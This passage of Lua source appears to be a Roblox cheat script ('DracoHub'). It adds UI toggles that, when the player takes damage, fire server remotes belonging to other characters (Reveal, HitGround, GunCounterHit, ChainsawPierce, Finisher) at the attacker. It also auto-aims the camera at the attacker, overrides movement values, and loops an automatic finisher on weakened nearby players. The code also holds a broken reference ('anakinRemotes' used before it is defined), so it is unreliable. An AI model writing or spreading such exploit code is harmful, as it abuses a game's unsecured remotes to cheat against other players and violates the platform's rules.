	local mDn50 = mBar:FindFirstChild("Down50Sw")
	local pDn50 = pBar:FindFirstChild("Down50Sw")
	if mLi then mLi.MouseButton1Click:Connect(tapCore) end
	if pLi then pLi.MouseButton1Click:Connect(tapCore) end
	if mSwBtn then mSwBtn.MouseButton1Click:Connect(tapGunSw) end
	if pSwBtn then pSwBtn.MouseButton1Click:Connect(tapGunSw) end
	if mDnBtn then mDnBtn.MouseButton1Click:Connect(tapDown40) end
	if pDnBtn then pDnBtn.MouseButton1Click:Connect(tapDown40) end
	if mDn50 then mDn50.MouseButton1Click:Connect(tapDown50) end
	if pDn50 then pDn50.MouseButton1Click:Connect(tapDown50) end
	local mForceBtn = mBar:FindFirstChild("ForceSw")
	local pForceBtn = pBar:FindFirstChild("ForceSw")
	if mForceBtn then mForceBtn.MouseButton1Click:Connect(tapForceSw) end
	if pForceBtn then pForceBtn.MouseButton1Click:Connect(tapForceSw) end
	mArr.MouseButton1Click:Connect(function()
	mArr.Visible = false
	mBar.Visible = true
	end)
	mBack.MouseButton1Click:Connect(function()
	mBar.Visible = false
	mArr.Visible = true
	end)
	local function setPBar(on)
	pBar.Visible = on
	local pcOn = LocalPlayer:GetAttribute("YYDSPC") == true
	pArr.Visible = (not on) and pcOn
	pHint.Visible = (not on) and pcOn
	end
	pArr.MouseButton1Click:Connect(function()
	setPBar(not pBar.Visible)
	end)
	pHead.MouseButton1Click:Connect(function()
	setPBar(false)
	end)
	end
	li.MouseButton1Click:Connect(function()
	local ion = li:GetAttribute("On") == true
	ion = not ion
	li:SetAttribute("On", ion)
	local k = li:FindFirstChild("Knob")
	local n = li:FindFirstChild("NameLab")
	if ion then
	li.BackgroundColor3 = Color3.fromRGB(42, 45, 53)
	if n then n.Visible = false end
	if k then
	k.Visible = true
	k.Position = UDim2.new(1, -22, 0.5, -9)
	k.BackgroundColor3 = Color3.fromRGB(70, 220, 90)
	end
	task.spawn(function()
	local armed = true
	local winAt = nil
	local winHp = 0
	local lastHp = 0
	local lastHurt = nil
	local lastTouch = nil
	local lastTouchAt = 0
	local touchConns = {}
	local trackedChar = nil
	local myChar0 = LocalPlayer.Character
	local hum0 = myChar0 and myChar0:FindFirstChildOfClass("Humanoid")
	if hum0 then
	lastHp = hum0.Health
	end
	local meterGui = nil
	local meterLab = nil
	local function hideMeter()
	if meterGui then
	meterGui:Destroy()
	meterGui = nil
	meterLab = nil
	end
	end
	local function showMeter(n)
	local ch = LocalPlayer.Character
	local head = ch and ch:FindFirstChild("Head")
	if not head then
	return
	end
	if (not meterGui) or meterGui.Parent ~= head then
	if meterGui then
	meterGui:Destroy()
	end
	meterGui = Instance.new("BillboardGui")
	meterGui.Name = "YYDSGunRegenMeter"
	meterGui.Size = UDim2.new(0, 60, 0, 28)
	meterGui.StudsOffset = Vector3.new(0, 2.4, 0)
	meterGui.AlwaysOnTop = true
	meterGui.Parent = head
	meterLab = Instance.new("TextLabel")
	meterLab.Size = UDim2.new(1, 0, 1, 0)
	meterLab.BackgroundTransparency = 1
	meterLab.Font = Enum.Font.GothamBold
	meterLab.TextSize = 20
	meterLab.TextColor3 = Color3.fromRGB(255, 230, 80)
	meterLab.TextStrokeTransparency = 0.3
	meterLab.Parent = meterGui
	end
	meterLab.Text = tostring(n)
	end
	while li.Parent and li:GetAttribute("On") == true do
	local myChar = LocalPlayer.Character
	local hum = myChar and myChar:FindFirstChildOfClass("Humanoid")
	local root = myChar and myChar:FindFirstChild("HumanoidRootPart")
	if myChar ~= trackedChar then
	for _, c in ipairs(touchConns) do
	c:Disconnect()
	end
	touchConns = {}
	trackedChar = myChar
	if myChar then
	for _, part in ipairs(myChar:GetDescendants()) do
	if part:IsA("BasePart") then
	table.insert(touchConns, part.Touched:Connect(function(hit)
	if not hit then return end
	local model = hit.Parent
	local pl = Players:GetPlayerFromCharacter(model)
	if (not pl) and model and model.Parent then
	pl = Players:GetPlayerFromCharacter(model.Parent)
	end
	if pl and pl ~= LocalPlayer then
	lastTouch = pl
	lastTouchAt = tick()
	end
	end))
	end
	end
	end
	end
	if root then
	for _, plrN in ipairs(Players:GetPlayers()) do
	if plrN ~= LocalPlayer and plrN.Character then
	local prN = plrN.Character:FindFirstChild("HumanoidRootPart")
	if prN and (prN.Position - root.Position).Magnitude <= 5 then
	lastTouch = plrN
	lastTouchAt = tick()
	end
	end
	end
	end
	if hum and hum.MaxHealth > 0 then
	if li:GetAttribute("IsWolverine") == true then
	hideMeter()
	elseif hum.Health < lastHp - 0.4 then
	if winAt == nil or (tick() - winAt) > 10 then
	winHp = lastHp
	end
	winAt = tick()
	local who = nil
	local boxes = { hum, myChar }
	for _, box in ipairs(boxes) do
	if box then
	for _, v in ipairs(box:GetChildren()) do
	local nm = string.lower(v.Name)
	local useful = string.find(nm, "creat") or string.find(nm, "last") or string.find(nm, "attack") or string.find(nm, "hit") or string.find(nm, "kill") or string.find(nm, "source") or string.find(nm, "damag")
	if v:IsA("ObjectValue") and v.Value then
	local val = v.Value
	local pl = nil
	if val:IsA("Player") then
	pl = val
	elseif val:IsA("Model") then
	pl = Players:GetPlayerFromCharacter(val)
	end
	if pl and pl ~= LocalPlayer then
	who = pl
	end
	elseif useful and v:IsA("StringValue") and v.Value ~= "" then
	local pl = Players:FindFirstChild(v.Value)
	if not pl then
	for _, px in ipairs(Players:GetPlayers()) do
	if px.Name == v.Value or px.DisplayName == v.Value then
	pl = px
	break
	end
	end
	end
	if pl and pl ~= LocalPlayer then
	who = pl
	end
	end
	end
	end
	end
	if who then
	lastHurt = who
	elseif lastTouch and (tick() - lastTouchAt) <= 2 then
	lastHurt = lastTouch
	end
	end
	if li:GetAttribute("IsWolverine") ~= true and li:GetAttribute("LiCore") ~= false and hum.MaxHealth > 0 then
	if lastHp > (hum.MaxHealth * 0.2) and hum.Health <= (hum.MaxHealth * 0.2) then
	if armed then
	armed = false
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local ghostFolder = chars and chars:FindFirstChild("Ghostface")
	local ghostRemotes = ghostFolder and ghostFolder:FindFirstChild("Remotes")
	local reveal = ghostRemotes and ghostRemotes:FindFirstChild("Reveal")
	if reveal then
	reveal:FireServer()
	end
	pcall(function()
	local an = hum:FindFirstChildOfClass("Animator") or hum
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18335483624"
	local ok, tr = pcall(function() return an:LoadAnimation(a) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
	end
	end)
	if reveal then
	task.spawn(function()
	for i = 2, 6 do
	task.wait(0.20)
	reveal:FireServer()
	end
	end)
	end
	end
	elseif hum.Health > (hum.MaxHealth * 0.2) then
	armed = true
	end
	end
	lastHp = hum.Health
	if li:GetAttribute("IsWolverine") ~= true and winAt and hum.MaxHealth > 0 then
	local need = hum.MaxHealth * 0.25
	local got = winHp - hum.Health
	if got < 0 then got = 0 end
	local n = math.floor((got / need) * 100 + 0.5)
	if n < 0 then n = 0 end
	if n > 100 then n = 100 end
	local since = tick() - winAt
	if got < 1 then
	winAt = nil
	winHp = lastHp
	hideMeter()
	elseif since <= 10 then
	showMeter(n)
	elseif since <= 11 then
	local fade = 1 - (since - 10)
	if fade < 0 then fade = 0 end
	local shown = math.floor(n * fade + 0.5)
	if shown < 0 then shown = 0 end
	if shown < 1 then
	winAt = nil
	winHp = lastHp
	hideMeter()
	else
	showMeter(shown)
	end
	else
	winAt = nil
	winHp = lastHp
	hideMeter()
	end
	end
	if li:GetAttribute("IsWolverine") ~= true and winAt and (tick() - winAt) <= 10 and hum.MaxHealth > 0 and (winHp - hum.Health) >= (hum.MaxHealth * 0.25) then
	winAt = nil
	winHp = hum.Health
	hideMeter()
	local marked = lastHurt
	local gunOn = li:GetAttribute("GunCounter") ~= false
	local mode = tonumber(li:GetAttribute("DownMode"))
	if mode == nil then
	mode = 50
	end
	local downOn = (mode == 40 or mode == 50)
	local pick = nil
	if gunOn and downOn then
	local forceOn = li:GetAttribute("ForceGunAfter2Down") ~= false
	local streak = tonumber(li:GetAttribute("DownStreak")) or 0
	if forceOn and streak >= 2 then
	pick = "gun"
	else
	local downChance = 0.4
	if mode == 50 then
	downChance = 0.5
	end
	if math.random() < downChance then
	pick = "down"
	else
	pick = "gun"
	end
	end
	elseif gunOn then
	pick = "gun"
	elseif downOn then
	pick = "down"
	end
	if pick == "down" then
	li:SetAttribute("DownStreak", (tonumber(li:GetAttribute("DownStreak")) or 0) + 1)
	elseif pick == "gun" then
	li:SetAttribute("DownStreak", 0)
	end
	if pick == "down" then
	task.spawn(function()
	local charD = LocalPlayer.Character
	if not charD then return end
	local hD = charD:FindFirstChildOfClass("Humanoid")
	local rD = charD:FindFirstChild("HumanoidRootPart")
	local animatorD = hD and hD:FindFirstChildOfClass("Animator")
	local oldWsD = 16
	local oldJpD = 50
	if hD then
	oldWsD = hD.WalkSpeed
	oldJpD = hD.JumpPower
	if oldWsD < 1 then oldWsD = 16 end
	if oldJpD < 1 then oldJpD = 50 end
	end
	if animatorD then
	task.spawn(function()
	local fade = 0.3
	local tNow = nil
	pcall(function()
	local a1 = Instance.new("Animation")
	a1.AnimationId = "rbxassetid://9725603001"
	tNow = animatorD:LoadAnimation(a1)
	if tNow then
	tNow.Priority = Enum.AnimationPriority.Action4
	tNow.Looped = false
	tNow:Play(fade)
	tNow.TimePosition = 0
	end
	end)
	task.wait(0.3)
	if tNow then
	tNow:Stop(fade)
	end
	pcall(function()
	local a2 = Instance.new("Animation")
	a2.AnimationId = "rbxassetid://12087571478"
	tNow = animatorD:LoadAnimation(a2)
	if tNow then
	tNow.Priority = Enum.AnimationPriority.Action4
	tNow.Looped = false
	tNow:Play(fade)
	tNow.TimePosition = 0
	end
	end)
	task.wait(0.8)
	if tNow then
	tNow.TimePosition = 0.8
	tNow:AdjustSpeed(0.001)
	end
	task.wait(1.5)
	if tNow then
	tNow.TimePosition = 0.8
	tNow:AdjustSpeed(1)
	end
	task.wait(0.9)
	if tNow then
	tNow:Stop(fade)
	end
	end)
	end
	local charsD = ReplicatedStorage:FindFirstChild("Characters")
	local gfD = charsD and charsD:FindFirstChild("Ghostface")
	local gfrD = gfD and gfD:FindFirstChild("Remotes")
	local revealD = gfrD and gfrD:FindFirstChild("Reveal")
	if revealD then
	revealD:FireServer()
	end
	task.spawn(function()
	if revealD then
	task.wait(0.20)
	revealD:FireServer()
	task.wait(0.20)
	revealD:FireServer()
	end
	end)
	local extraPick = "dash"
	do
	local lastSB = tonumber(li:GetAttribute("LiSBAt")) or 0
	local sbReady = (tick() - lastSB) >= 12.5
	local r = math.random()
	if sbReady then
	if r < 0.33 then
	extraPick = "sb"
	elseif r < 0.66 then
	extraPick = "dyn"
	else
	extraPick = "dash"
	end
	else
	if r < 0.5 then
	extraPick = "dyn"
	else
	extraPick = "dash"
	end
	end
	end
	task.spawn(function()
	task.wait(0.3)
	local charsX = ReplicatedStorage:FindFirstChild("Characters")
	if extraPick == "sb" then
	li:SetAttribute("LiSBAt", tick())
	local sb = charsX and charsX:FindFirstChild("SoldierBoy")
	local sbr = sb and sb:FindFirstChild("Remotes")
	local mv = sbr and sbr:FindFirstChild("MoveTwo")
	if mv then
	mv:FireServer()
	end
	elseif extraPick == "dyn" then
	local vg = charsX and charsX:FindFirstChild("Vigilante")
	local vgr = vg and vg:FindFirstChild("Remotes")
	local dyn = vgr and vgr:FindFirstChild("Dynamite")
	if dyn then
	dyn:FireServer()
	end
	end
	end)
	local leftD = 3.50
	while leftD > 0 do
	local dtD = RunService.Heartbeat:Wait()
	leftD = leftD - dtD
	if hD then
	hD.WalkSpeed = 0
	hD.JumpPower = 0
	hD.Sit = false
	hD.PlatformStand = false
	end
	end
	local leftU = 0.10
	while leftU > 0 do
	local dtU = RunService.Heartbeat:Wait()
	leftU = leftU - dtU
	if hD then
	hD.WalkSpeed = oldWsD
	hD.JumpPower = oldJpD
	hD.Sit = false
	hD.PlatformStand = false
	end
	if rD then
	rD.Anchored = false
	end
	end
	if extraPick == "dash" then
	local dashTrack = nil
	local dashConn = nil
	local sawOnce = false
	if hD then
	hD.WalkSpeed = 40
	hD.JumpPower = oldJpD
	hD.Sit = false
	hD.PlatformStand = false
	hD.AutoRotate = true
	end
	pcall(function()
	if animatorD then
	local da = Instance.new("Animation")
	da.AnimationId = "rbxassetid://83452242911817"
	dashTrack = animatorD:LoadAnimation(da)
	if dashTrack then
	dashTrack.Priority = Enum.AnimationPriority.Action4
	dashTrack:Play(0.1)
	end
	end
	end)
	dashConn = RunService.RenderStepped:Connect(function()
	local ch = LocalPlayer.Character
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	local rp = ch and ch:FindFirstChild("HumanoidRootPart")
	if hum and hum.Parent and hum.Health > 0 then
	hum.WalkSpeed = 40
	hum.Sit = false
	hum.PlatformStand = false
	hum:Move(Vector3.new(0, 0, -1), true)
	end
	if (not sawOnce) and rp then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local tch = plr.Character
	local tr = tch and tch:FindFirstChild("HumanoidRootPart")
	if tr and (tr.Position - rp.Position).Magnitude <= 7 then
	sawOnce = true
	local charsC = ReplicatedStorage:FindFirstChild("Characters")
	local vg = charsC and charsC:FindFirstChild("Vigilante")
	local vgr = vg and vg:FindFirstChild("Remotes")
	local pierce = vgr and vgr:FindFirstChild("ChainsawPierce")
	if pierce then
	pierce:FireServer()
	end
	break
	end
	end
	end
	end
	end)
	task.wait(1)
	if dashConn then
	dashConn:Disconnect()
	end
	if dashTrack then
	dashTrack:Stop(0.2)
	end
	if hD then
	hD.WalkSpeed = oldWsD
	hD.JumpPower = oldJpD
	end
	end
	end)
	elseif pick == "gun" then
	task.spawn(function()
	local char = LocalPlayer.Character
	if not char then return end
	local rpart = char:FindFirstChild("HumanoidRootPart")
	local h2 = char:FindFirstChildOfClass("Humanoid")
	local animator = h2 and h2:FindFirstChildOfClass("Animator")
	if not rpart or not animator then return end
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local ghostFolder = chars and chars:FindFirstChild("Ghostface")
	local ghostRemotes = ghostFolder and ghostFolder:FindFirstChild("Remotes")
	local reveal = ghostRemotes and ghostRemotes:FindFirstChild("Reveal")
	local hg = chars and chars:FindFirstChild("Homelander")
	local hgr = hg and hg:FindFirstChild("Remotes")
	local hitG = hgr and hgr:FindFirstChild("HitGround")
	if hitG and marked then
	local args = { [1] = marked.DisplayName }
	hitG:FireServer(unpack(args))
	local args2 = { [1] = marked.Name }
	hitG:FireServer(unpack(args2))
	local args3 = { [1] = marked.Character }
	hitG:FireServer(unpack(args3))
	end
	local oldWs = h2.WalkSpeed
	local oldJp = h2.JumpPower
	local sitTrack = nil
	task.wait(0.25)
	local backDir = -rpart.CFrame.LookVector
	local slideDist = 25
	local actualDist = slideDist
	local rayParams = RaycastParams.new()
	rayParams.FilterDescendantsInstances = {char}
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	local rayResult = workspace:Raycast(rpart.Position, backDir * slideDist, rayParams)
	if rayResult then
	actualDist = math.max(0, (rayResult.Position - rpart.Position).Magnitude - 1.5)
	end
	local targetPos = rpart.Position + Vector3.new(backDir.X * actualDist, 0, backDir.Z * actualDist)
	local sitAnim = Instance.new("Animation")
	sitAnim.AnimationId = "rbxassetid://109939149016282"
	local okSit, sitOk = pcall(function()
	return animator:LoadAnimation(sitAnim)
	end)
	if okSit and sitOk then
	sitTrack = sitOk
	sitTrack.Priority = Enum.AnimationPriority.Action4
	sitTrack.Looped = false
	sitTrack:Play(0)
	sitTrack.TimePosition = 0.0
	task.delay(0.80, function()
	if sitTrack then
	sitTrack:Stop(0.1)
	end
	end)
	end
	local elapsed = 0
	local slideTime = 0.80
	local aimStartYaw = nil
	local aimMarkId = nil
	local function setYawKeepPitch(cam, targetYaw)
	local cf = cam.CFrame
	local look = cf.LookVector
	local pitch = math.asin(math.clamp(look.Y, -1, 1))
	local cp = math.cos(pitch)
	local newLook = Vector3.new(-math.sin(targetYaw) * cp, math.sin(pitch), -math.cos(targetYaw) * cp)
	cam.CFrame = CFrame.lookAt(cf.Position, cf.Position + newLook, Vector3.new(0, 1, 0))
	end
	local function angleDiff(a, b)
	local d = a - b
	return math.atan2(math.sin(d), math.cos(d))
	end
	local cam0 = workspace.CurrentCamera
	local oldCamType = cam0 and cam0.CameraType
	if cam0 then
	cam0.CameraType = Enum.CameraType.Scriptable
	end
	while elapsed < slideTime do
	local dt = RunService.Heartbeat:Wait()
	elapsed = elapsed + dt
	local alpha = math.min(elapsed / slideTime, 1)
	local currentPos = rpart.Position:Lerp(targetPos, alpha)
	rpart.CFrame = CFrame.new(currentPos, currentPos + rpart.CFrame.LookVector)
	if marked then
	local tChar = marked.Character
	local tHead = tChar and (tChar:FindFirstChild("Head") or tChar:FindFirstChild("HumanoidRootPart"))
	local cam = workspace.CurrentCamera
	if cam and tHead then
	local camPos = cam.CFrame.Position
	local dir = tHead.Position - camPos
	local targetYaw = math.atan2(-dir.X, -dir.Z)
	local markId = marked.UserId
	if aimStartYaw == nil or aimMarkId ~= markId then
	local look = cam.CFrame.LookVector
	aimStartYaw = math.atan2(-look.X, -look.Z)
	aimMarkId = markId
	end
	local progress = math.clamp(elapsed / slideTime, 0, 1)
	local ease = 1 - (1 - progress) ^ 3
	local diff = angleDiff(targetYaw, aimStartYaw)
	local currentYaw = aimStartYaw + diff * ease
	setYawKeepPitch(cam, currentYaw)
	end
	end
	end
	aimStartYaw = nil
	aimMarkId = nil
	if cam0 and oldCamType then
	cam0.CameraType = oldCamType
	end
	if reveal then
	reveal:FireServer()
	reveal:FireServer()
	end
	h2.WalkSpeed = 0
	h2.JumpPower = 0
	task.wait(0.1)
	if sitTrack then
	sitTrack:Stop(0.1)
	end
	local pointAnim = Instance.new("Animation")
	pointAnim.AnimationId = "rbxassetid://507770453"
	local okPoint, pointTrack = pcall(function()
	return animator:LoadAnimation(pointAnim)
	end)
	if okPoint and pointTrack then
	pointTrack.Priority = Enum.AnimationPriority.Action2
	pointTrack:Play(0.1, 1, 1)
	task.wait(0.8)
	pointTrack:AdjustSpeed(0)
	task.wait(1.60)
	local leftU = 0.20
	while leftU > 0 do
	local dtU = RunService.Heartbeat:Wait()
	leftU = leftU - dtU
	if h2 then
	if h2.WalkSpeed < oldWs then
	h2.WalkSpeed = oldWs
	end
	if h2.JumpPower < oldJp then
	h2.JumpPower = oldJp
	end
	h2.Sit = false
	h2.PlatformStand = false
	h2.AutoRotate = true
	end
	if rpart then
	rpart.Anchored = false
	end
	end
	pointTrack:Stop(0.3)
	else
	task.wait(2.6)
	end
	if h2 then
	h2.WalkSpeed = oldWs
	h2.JumpPower = oldJp
	end
	end)
	task.spawn(function()
	task.wait(1.9)
	if li:GetAttribute("IsWolverine") == true or li:GetAttribute("GunCounter") ~= true then
	return
	end
	local t = marked
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local vig = chars and chars:FindFirstChild("Vigilante")
	local vigR = vig and vig:FindFirstChild("Remotes")
	local combat = vigR and vigR:FindFirstChild("GunshotCombat")
	local scp = chars and chars:FindFirstChild("Walter")
	local scpR = scp and scp:FindFirstChild("Remotes")
	local hit = scpR and scpR:FindFirstChild("GunCounterHit")
	local hitG = chars and chars:FindFirstChild("Homelander")
	hitG = hitG and hitG:FindFirstChild("Remotes")
	hitG = hitG and hitG:FindFirstChild("HitGround")
	for n = 1, 5 do
	if combat then
	combat:FireServer()
	end
	if hit and t then
	hit:FireServer(t.DisplayName)
	hit:FireServer(t.Name)
	hit:FireServer(t.Character)
	end
	if n < 5 then
	task.wait(0.35)
	end
	end
	task.wait(0.5)
	local leftFree = 3
	while leftFree > 0 do
	local dtF = RunService.Heartbeat:Wait()
	leftFree = leftFree - dtF
	local chF = LocalPlayer.Character
	local hF = chF and chF:FindFirstChildOfClass("Humanoid")
	local rF = chF and chF:FindFirstChild("HumanoidRootPart")
	if hF then
	if hF.WalkSpeed < 16 then
	hF.WalkSpeed = 16
	end
	hF.Sit = false
	hF.PlatformStand = false
	hF.AutoRotate = true
	pcall(function()
	hF:ChangeState(Enum.HumanoidStateType.Running)
	end)
	end
	if rF then
	rF.Anchored = false
	end
	end
	end)
	end
	end
	if li:GetAttribute("LiCore") ~= false and (hum.Health / hum.MaxHealth) <= 0.2 then
	if armed then
	armed = false
	if li:GetAttribute("IsWolverine") == true then
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local ghostFolder = chars and chars:FindFirstChild("Ghostface")
	local ghostRemotes = ghostFolder and ghostFolder:FindFirstChild("Remotes")
	local reveal = ghostRemotes and ghostRemotes:FindFirstChild("Reveal")
	if reveal then
	reveal:FireServer()
	end
	pcall(function()
	local an = hum:FindFirstChildOfClass("Animator") or hum
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18335483624"
	local ok, tr = pcall(function() return an:LoadAnimation(a) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
	end
	end)
	if reveal then
	task.spawn(function()
	for i = 2, 6 do
	task.wait(0.20)
	reveal:FireServer()
	end
	end)
	end
	else
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local ghostFolder = chars and chars:FindFirstChild("Ghostface")
	local ghostRemotes = ghostFolder and ghostFolder:FindFirstChild("Remotes")
	local reveal = ghostRemotes and ghostRemotes:FindFirstChild("Reveal")
	local anakinFolder = chars and chars:FindFirstChild("Anakin")
	local anakinRemotes = anakinFolder and anakinRemotes:FindFirstChild("Remotes")
	local rage = anakinRemotes and anakinRemotes:FindFirstChild("Rage")
	if reveal then
	reveal:FireServer()
	end
	if rage then
	rage:FireServer()
	end
	if reveal then
	task.spawn(function()
	for i = 2, 6 do
	task.wait(0.20)
	reveal:FireServer()
	end
	end)
	end
	end
	end
	else
	armed = true
	end
	end
	task.wait(0.05)
	end
	for _, c in ipairs(touchConns) do
	c:Disconnect()
	end
	hideMeter()
	end)
	else
	if li:GetAttribute("IsWolverine") == true then
	li.BackgroundColor3 = Color3.fromRGB(214, 158, 28)
	else
	li.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	end
	if n then n.Visible = true end
	if k then
	k.Visible = false
	k.Position = UDim2.new(0, 4, 0.5, -9)
	k.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	end
	end)
	end
	end
	end)
	wvBtn.MouseButton1Click:Connect(function()
	if skinPage then skinPage.Visible = false end
	if wvBtn.Visible then
	if skinArr then skinArr.Visible = true end
	end
	if healBtn:GetAttribute("On") ~= true then
	return
	end
	local fg2 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local li = fg2 and fg2:FindFirstChild("LifeInsure")
	local roarNow = fg2 and fg2:FindFirstChild("Roar")
	if roarNow then roarNow:Destroy() end
	if li and li.Visible and li:GetAttribute("IsWolverine") == true then
	healBtn:SetAttribute("On", false)
	healPic1.Visible = true
	healPic2.Visible = true
	healBtn.Size = UDim2.new(1, -62, 0, 24)
	healBtn.Position = UDim2.new(0, 57, 0, 144)
	healBtn.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	healBtn.Text = "X-Regen"
	healInPic.Visible = false
	wvBtn.Visible = false
	if skinArr then skinArr.Visible = false end
	if skinPage then skinPage.Visible = false end
	morePage.Visible = false
	if fg2 then
	local b = fg2:FindFirstChild("DeadpoolSkill")
	if b then b.Visible = false end
	end
	if li then
	li.Visible = false
	li:SetAttribute("On", false)
	local k = li:FindFirstChild("Knob")
	local n = li:FindFirstChild("NameLab")
	if n then n.Visible = true end
	if k then
	k.Visible = false
	k.Position = UDim2.new(0, 4, 0.5, -9)
	end
	end
	roarNow.Visible = false
	return
	end
	if fg2 then
	local b = fg2:FindFirstChild("DeadpoolSkill")
	if b then b.Visible = false end
	end
	homelanderModActive = false
	aTrainModActive = false
	kiraAim = false
	if updateHomelanderModButton then updateHomelanderModButton() end
	if updateATrainModButton then updateATrainModButton() end
	if HomelanderModBtn then
	HomelanderModBtn.Text = "Homelander"
	HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 60)
	HomelanderModBtn.Size = UDim2.new(1, -10, 0, 24)
	end
	if FinisherButton then FinisherButton.Visible = false end
	if ATrainModBtn then
	ATrainModBtn.Text = "A-Train"
	ATrainModBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 184)
	end
	if KiraModBtn then
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	end
	if KiraAimButton then KiraAimButton.Visible = false end
	if LaserButton then LaserButton.Visible = false end
	if FlashstrikeButton then FlashstrikeButton.Visible = false end
	if KickButton then KickButton.Visible = false end
	if UpthrowButton then UpthrowButton.Visible = false end
	if MoAimButton then MoAimButton.Visible = false end
	if fg2 then
	for _, nm in ipairs({"HomeExtra", "Stalk", "MMLifeInsure", "NeckSnap", "MyersStab", "TerrorBlade", "Roar"}) do
	local x = fg2:FindFirstChild(nm)
	if x then x.Visible = false end
	end
	end
	if li then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	li.Size = UDim2.new(0, 44, 0, 44)
	li.Position = UDim2.new(0.5, 68, 1, -96)
	local hv = li:FindFirstChild("PcHint")
	if not hv then
	hv = Instance.new("TextLabel")
	hv.Name = "PcHint"
	hv.Size = UDim2.new(1, 0, 0, 12)
	hv.Position = UDim2.new(0, 0, 1, -6)
	hv.BackgroundTransparency = 1
	hv.Font = Enum.Font.GothamBold
	hv.TextSize = 11
	hv.TextColor3 = Color3.fromRGB(230, 230, 230)
	hv.Text = "V"
	hv.Parent = li
	end
	hv.Visible = true
	else
	li.Size = UDim2.new(0, 60, 0, 30)
	li.Position = UDim2.new(1, -240, 0.5, -156)
	local hv = li:FindFirstChild("PcHint")
	if hv then hv.Visible = false end
	end
	li.Visible = true
	li.BackgroundColor3 = Color3.fromRGB(214, 158, 28)
	li:SetAttribute("IsWolverine", true)
	local pounceNow = fg2 and fg2:FindFirstChild("Pounce")
	if pounceNow then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	pounceNow.Size = UDim2.new(0, 44, 0, 44)
	pounceNow.Position = UDim2.new(0.5, -140, 1, -96)
	else
	pounceNow.Size = UDim2.new(0, 60, 0, 60)
	pounceNow.Position = UDim2.new(1, -310, 0.5, -100)
	end
	pounceNow.Visible = true
	end
	li:SetAttribute("On", false)
	local kOff = li:FindFirstChild("Knob")
	local nOff = li:FindFirstChild("NameLab")
	if nOff then
	nOff.Text = "WVLife Insure"
	nOff.Visible = true
	end
	if kOff then
	kOff.Visible = false
	kOff.Position = UDim2.new(0, 4, 0.5, -9)
	kOff.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	local mbOff = li:FindFirstChild("LiMBar")
	local pbOff = li:FindFirstChild("LiPBar")
	if mbOff then mbOff.Visible = false end
	if pbOff then pbOff.Visible = false end
	li:SetAttribute("GunCounter", false)
	if li:GetAttribute("LiRiot") == nil then
	li:SetAttribute("LiRiot", true)
	end
	if li:GetAttribute("AutoFinish") == nil then
	li:SetAttribute("AutoFinish", true)
	end
	if li:GetAttribute("AfHooked") ~= true then
	li:SetAttribute("AfHooked", true)
	task.spawn(function()
	local cd = 0
	local function inRange()
	local me = LocalPlayer.Character
	local root = me and me:FindFirstChild("HumanoidRootPart")
	if not root then return false end
	local pos = Vector3.new(root.Position.X, 0, root.Position.Z)
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	if h and r and h.Health > 0 and h.Health <= 20 then
	local tp = Vector3.new(r.Position.X, 0, r.Position.Z)
	if (tp - pos).Magnitude <= 10 then
	return true
	end
	end
	end
	end
	return false
	end
	local function playingAnim()
	local ch = LocalPlayer.Character
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	local an = hum and hum:FindFirstChildOfClass("Animator")
	if not an then return false end
	for _, tr in ipairs(an:GetPlayingAnimationTracks()) do
	if tr.Animation and string.find(tr.Animation.AnimationId, "93943397667163") then
	return true
	end
	end
	return false
	end
	while li and li.Parent do
	if li.Visible and li:GetAttribute("IsWolverine") == true and li:GetAttribute("On") == true and li:GetAttribute("AutoFinish") ~= false and tick() >= cd and inRange() then
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local demo = chars and chars:FindFirstChild("Demogorgon")
	local rem = demo and demo:FindFirstChild("Remotes")
	local fin = rem and rem:FindFirstChild("Finisher")
	while fin and li.Parent and li:GetAttribute("On") == true and li:GetAttribute("AutoFinish") ~= false do
	if playingAnim() then
	cd = tick() + 6
	break
	end
	pcall(function() fin:FireServer() end)
	local seen = false
	local t = 0
	while t < 0.5 do
	if playingAnim() then
	seen = true
	break
	end
	task.wait(0.02)
	t = t + 0.02
	end
	if seen then
	cd = tick() + 6
	break
	end
	end
	end
	task.wait(0.1)
	end
	end)
	end
	local pcWv = LocalPlayer:GetAttribute("YYDSPC") == true
	local mArrW = li:FindFirstChild("LiMArrow")
	local pArrW = li:FindFirstChild("LiPArrow")
	local pHintW = li:FindFirstChild("LiRHint")
	local mBarW = li:FindFirstChild("LiMBar")
	local pBarW = li:FindFirstChild("LiPBar")
	if mBarW then mBarW.Visible = false end
	if pBarW then pBarW.Visible = false end
	if mArrW then mArrW.Visible = not pcWv end
	if pArrW then pArrW.Visible = pcWv end
	if pHintW then pHintW.Visible = pcWv end
	for _, bar in ipairs({mBarW, pBarW}) do
	if bar then
	bar.Size = UDim2.new(0, 186, 0, 96)
	if bar.Name == "LiPBar" then
	bar.Position = UDim2.new(0.5, -85, 0, -100)
	end
	local afTxt = bar:FindFirstChild("AfTxt")
	if not afTxt then
	afTxt = Instance.new("TextLabel")
